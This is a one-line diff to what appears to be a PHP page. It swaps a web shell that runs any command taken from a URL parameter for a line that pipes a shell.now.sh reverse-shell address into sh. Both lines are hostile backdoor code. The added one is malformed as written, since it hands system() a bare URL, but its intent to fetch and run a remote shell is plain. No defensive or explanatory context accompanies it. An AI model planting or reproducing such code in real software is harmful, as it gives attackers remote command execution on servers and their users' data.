@@ -1,1 +1,1 @@
-<pre>system($_GET["Legion"])</pre>
+<pre>system('https://shell.now.sh/10.0.2.15:3000 | sh')</pre>
